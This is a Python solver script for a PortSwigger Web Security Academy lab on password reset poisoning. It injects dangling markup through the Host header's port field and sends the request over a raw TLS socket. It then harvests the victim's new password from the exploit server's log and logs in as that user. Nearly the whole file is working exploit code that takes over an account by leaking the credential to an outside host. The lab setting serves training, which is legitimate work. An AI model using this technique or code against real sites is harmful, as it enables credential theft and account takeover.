#!/usr/bin/env python3
"""
Password reset poisoning via dangling markup
PortSwigger Web Security Academy -- HTTP Host Header Attacks

Companion script for the writeup: 07-password-reset-poisoning-via-dangling-markup.md

What this does -- and why it needs a raw socket:
    Full Host header replacement is rejected outright here (504), but the
    port field survives validation and gets reflected, unescaped, inside a
    single-quoted href attribute in the reset email. We inject
    Host: lab.net:'<a href="//exploit-domain/? -- the leading ' closes the
    original href, and the new unterminated "-quoted <a> tag swallows every
    character printed after it, including the new password, into a dangling
    URL. Because that payload is a colon-prefixed value inside the Host
    header rather than a clean hostname, httpx's header handling isn't the
    obstacle here (it will send arbitrary Host string values) -- but sending
    it reliably alongside the rest of the raw POST needs the same raw-socket
    control this series uses whenever a single clean httpx.Client() call
    can't be trusted to preserve exact bytes on a security-sensitive header.
    An email security scanner in the lab follows the dangling link
    automatically, so no click from carlos is required -- the leaked
    password shows up directly in the exploit server's access log.

Usage:
    python 07-password-reset-poisoning-via-dangling-markup.py <lab-url>
    e.g. python 07-password-reset-poisoning-via-dangling-markup.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def solve(lab_url: str) -> None:
    target_host = urlparse(lab_url).hostname
    client = httpx.Client(verify=False, follow_redirects=True, timeout=15)

    home = client.get(lab_url)
    exploit_m = re.search(r'(https://exploit-[^/]+\.exploit-server\.net)', home.text)
    if not exploit_m:
        print("[-] Could not find exploit server link on the homepage.")
        return
    exploit_server = exploit_m.group(1)
    exploit_domain = exploit_server.replace("https://", "")
    print(f"[*] Exploit server: {exploit_domain}")

    cookies = dict(client.cookies)
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

    csrf_page = client.get(f"{lab_url}/forgot-password")
    csrf_m = re.search(r'name="csrf"\s+value="([^"]+)"', csrf_page.text)
    if not csrf_m:
        print("[-] No CSRF token on the forgot-password page.")
        return
    csrf = csrf_m.group(1)
    print(f"[*] CSRF: {csrf[:20]}...")

    # ' closes the original href='...' attribute; the unterminated "-quoted
    # <a> tag that follows swallows everything printed after it, including
    # the new password, into its href.
    dangling_host = f"""{target_host}:'<a href="//{exploit_domain}/?"""
    body = f"csrf={csrf}&username=carlos"

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = socket.create_connection((target_host, 443), timeout=15)
    ssock = ctx.wrap_socket(sock, server_hostname=target_host)

    req = (
        f"POST /forgot-password HTTP/1.1\r\n"
        f"Host: {dangling_host}\r\n"
        f"Cookie: {cookie_str}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{body}"
    )
    print("[*] Sending dangling-markup reset request for carlos...")
    ssock.sendall(req.encode())
    resp = b""
    while True:
        data = ssock.recv(4096)
        if not data:
            break
        resp += data
    ssock.close()
    status_line = resp.decode("utf-8", errors="replace").split("\r\n")[0]
    print(f"[*] Response: {status_line}")

    print("[*] Waiting for the email security scanner to follow the dangling link...")
    time.sleep(5)

    log_r = client.get(f"{exploit_server}/log")
    passwords = re.findall(r'10\.0\.\d+\.\d+.*?password:\+(\w+)', log_r.text)
    if not passwords:
        time.sleep(5)
        log_r = client.get(f"{exploit_server}/log")
        passwords = re.findall(r'10\.0\.\d+\.\d+.*?password:\+(\w+)', log_r.text)

    if not passwords:
        print("[-] No password captured in the exploit server log yet. Re-check /log manually.")
        return

    carlos_password = passwords[-1]
    print(f"[+] Captured carlos's password: {carlos_password}")

    print("[*] Logging in as carlos...")
    login_page = client.get(f"{lab_url}/login")
    login_csrf_m = re.search(r'name="csrf"\s+value="([^"]+)"', login_page.text)
    login_csrf = login_csrf_m.group(1) if login_csrf_m else ""
    client.post(f"{lab_url}/login", data={
        "csrf": login_csrf,
        "username": "carlos",
        "password": carlos_password,
    })

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- logged in as carlos via dangling markup password exfiltration.")
    else:
        print("[-] Not solved yet -- inspect the login response.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
